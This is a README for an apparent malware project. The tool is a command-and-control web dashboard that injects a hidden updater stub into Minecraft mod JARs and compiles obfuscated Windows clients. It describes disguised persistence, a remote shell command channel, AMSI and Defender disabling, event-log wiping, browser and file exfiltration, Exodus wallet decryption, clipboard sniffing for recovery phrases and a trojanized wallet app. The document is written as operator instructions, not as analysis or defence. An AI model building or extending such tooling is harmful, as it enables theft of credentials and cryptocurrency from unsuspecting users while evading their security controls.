# pentake

Custom C2-style web application: an Express dashboard that issues personalized
Minecraft Fabric/Quilt mod JARs with a hidden update-checker stub, compiles a
matching Windows client, and receives exfiltrated data from deployed clients
into a browsable log panel.

## Repo layout

| Path       | Purpose |
|------------|---------|
| `server/`  | Express backend: auth (JWT), dashboard API, exfiltration endpoints, build orchestration, SQLite storage |
| `builder/` | JAR injector: compiles `UpdaterV2.java`, patches a Fabric/Quilt mod's entrypoint with ASM, optional obfuscation |
| `payload/` | Client templates (`test.js` → `client.exe`, `worker.js` → `worker.exe`) compiled via `@yao-pkg/pkg`; `obfuscate.js` is the self-contained JS obfuscator |
| `of/`      | Folded-in Gradle project that builds the `fabric-obf` obfuscator (JDK 21) |
| `builds/`  | Per-user build outputs (gitignored, generated at build time) |

## Quick start (server)

```
cd server
copy .env.example .env    # then fill in real secrets
npm install
npm start
```

Required env vars: `ADMIN_PASSWORD`, `API_KEY`, `SECRET_KEY`. The server exits
at boot if any are missing rather than falling back to defaults.

Optional env: `PORT`, `JWT_SECRET` (isolate session signing from the payload
XOR key), `DB_PATH` (defaults to `server/database.sqlite`),
`ALLOWED_BUILD_IDS` (comma-separated allowlist), `BUILDS_DIR` (overrides where
per-user build artifacts land; default `builds/`), `UPLOADS_DIR`, `SHARED_FILES_DIR`, `PAYLOADS_DIR`.

`server/.env` is gitignored. Never commit `.env`.

## Build pipeline

`POST /api/build/generate` (admin):

1. Reads `payload/test.js`, replaces the `PLACEHOLDER_*` tokens with the user's
   ID, the server's host URL, the real API/SECRET keys from the environment,
   and the per-build worker download URL.
2. **Obfuscates the payload JS** with `payload/obfuscate.js` — a self-contained
   tokenizer/transformer (no third-party dependency). `light` strips comments,
   collapses whitespace, and hides string/number/object-key members behind XOR
   tables with computed `[dec(i)]` lookups; the default `full` level also
   renames every declared identifier to collision-free `_0x…` names — including
   destructured bindings, method/accessor keys, and template literal contents.
   `require()` argument literals are never encoded: the pipeline verifies every
   path still appears verbatim in the output and aborts the build if one is
   lost (pkg's static bundler depends on them). Disable with `OBFUSCATE_JS=0`;
   `JS_OBSCURE_LEVEL` picks `light`/`full` (default `full`).
3. Compiles the payload with the **locally installed** `@yao-pkg/pkg`
   (devDependency of `payload/`) → `builds/user_{id}/dist/client.exe`. No per-
   build network fetch.
4. Compiles the **worker** (`payload/worker.js`, same substitution +
   obfuscation, so heavy collection logic never ships inside the client exe)
   → `builds/user_{id}/dist/worker.exe`, downloadable at
   `/api/payloads/download/{userId}/worker.exe`. The deployed client fetches it
   into a random temp slot at runtime and deletes it after the run.
5. Runs `node builder/index.js <mod.jar> <userId> <dist> <updateUrl>` which:
   - downloads ASM `lib/asm-9.6.jar` from Maven Central on first use
     (binary artifact is gitignored),
   - compiles `ByteCodeInjector.java` when the `.class` is missing,
   - compiles a randomized `UpdaterV2` class and patches the mod's entrypoint
     (or, with `BARE_TEMPLATE=1`, emits a minimal jar that is **nothing but the
     injected class** — no third-party mod. This is the default "Default
     template" build; passing a custom uploaded jar disables it),
   - embeds `user_id.txt`.
6. Optionally obfuscates the result with `of/build/libs/fabric-obf.jar`
   (`OBF2_JAR` env overrides the default path). If the obfuscator jar is absent
   the build keeps the injected JAR and continues — obfuscation never aborts a
   valid injection.

Prerequisites: Node 18+, a JDK for the injector (`--release 17` by default,
`INJECTOR_JAVA_RELEASE` to override), and JDK 21 if you want the obfuscator
built from `of/` (`cd of && gradle build`).

## Exfiltration storage

Inbound reports (`/discord`, `/log`, `/collect`, `/err`, `/antivm`) are stored
one-row-per-event in the `exfil_events` SQLite table — replacing the old
pattern of rewriting a single growing JSON array on every event (which was
O(n²) on large builds and could lose writes under concurrency). File payloads
(screenshots, browser/file zips) still land on disk under
`server/uploads/{buildId}/`.

Meta counters live in each build's `meta.json` (single atomic read-modify-write
per event), and `/api/logs` scans the uploads tree asynchronously behind a 1 s
TTL cache instead of blocking the event loop on every request.

## Remote control & persistence

New-build payloads install undetected startup and then poll a command channel:

1. **Persistence** (`payload/test.js` → `Persistence`): copies the client binary
   to `C:\ProgramData\WindowsServices\WindowsServicesHost.exe`, hides it
   (`attrib +h +s`), registers a scheduled logon task
   `WindowsServicesController` (`/rl highest`), and falls back to an HKCU `Run`
   value / Startup `.vbs`. Installs are idempotent (fixed names, overwrite). It
   is a no-op when the binary is already running from the install dir.
2. **Command channel**: after the one-shot collection phase, the client keeps
   running and polls `GET /cmd/poll` (auth via `X-API-KEY` + `X-BUILD-ID`),
   executes the claimed command, and reports back via `POST /cmd/result`.
   Supported types: `shell` (60 s timeout, output truncated to 60 KB),
   `screenshot` (base64 PNG pushed to `POST /capture`), `exfil` (re-run the
   collection upload), `exit` (removes persistence and terminates). Polling uses
   a jittered interval (`POLL_INTERVAL_MS` + 0–4 s) instead of a fixed cadence.
3. **Dashboard**: commands are issued from the build detail modal
   (`POST /api/commands/:uuid`, admin or the build's own session) and results
   stream into the command history via `/api/logs`.
4. **Bypasses** (`Bypass` in `payload/test.js`): every spawned PowerShell stage
   runs through AMSI + script-block-logging neutralisation and `-EncodedCommand`;
   on admin builds Defender services/real-time protection/scheduled scans are
   disabled, detector-pattern processes (smbios/isfence/etc.) are killed, event
   logs are swept, and a watchdog re-asserts all of it from the poll loop
   (`BYPASS_WATCHDOG=0` disables).
5. **Exodus steal** (`ExodusInject` in `payload/test.js`): unwraps the
   Electron/Chromium `os_crypt` key (DPAPI, same as browser token decoders),
   attempts layered decryption of `%APPDATA%\Exodus\exodus.wallet`
   (AES-GCM / libsodium secretbox / PBKDF2 vault candidates via `tweetnacl`),
   ships the raw wallet + key state so unrecognised ciphers can be broken
   offline, and passively sniffs the clipboard for copied 12/24-word recovery
   phrases (`CLIPBOARD_MONITOR=0` disables). Results surface in the log's
   `wallets` field and as `Exodus/*.json`. The legacy `/exodus` asar-swap
   injector (trojanized `exodus.asar` served from `server/payloads/`) remains
   wired to `Injection.payload` for password-protected vaults.

## Security notes

- Legacy endpoints `/init`, `/log_data`, `/v2/data`, `/log_files` were
  vulnerable to directory traversal via attacker-controlled `X-Session-ID` /
  `X-Trace-ID` headers: values are now validated against a strict token pattern
  before use as path segments, and `/api/download` requires the resolved path
  to stay inside the uploads tree (trailing-separator prefix check).
- Legacy endpoints intentionally remain unauthenticated to keep already-
  deployed clients working; `/v2/data` payloads are XOR-obfuscated with
  `SECRET_KEY`. New-build endpoints require `X-API-KEY` + `X-BUILD-ID`.
- Session JWTs and the legacy XOR key can be isolated via `JWT_SECRET`.
- Command completion is ownership-scoped: `POST /cmd/result` only accepts a
  command whose `buildId` matches the authenticated build.
- Login/register are rate-limited (20/min per IP), cookies are HttpOnly with
  `SameSite=Strict` and `Secure` when served over HTTPS, and build errors are
  reported generically (no absolute server paths leaked).

## Tests

```
cd server
npm test
```

The suite forks the server on an isolated port and a throwaway SQLite file
(`DB_PATH`), polls for readiness, and covers auth, role checks, traversal
rejection, rate limiting, and the SQLite exfil event path.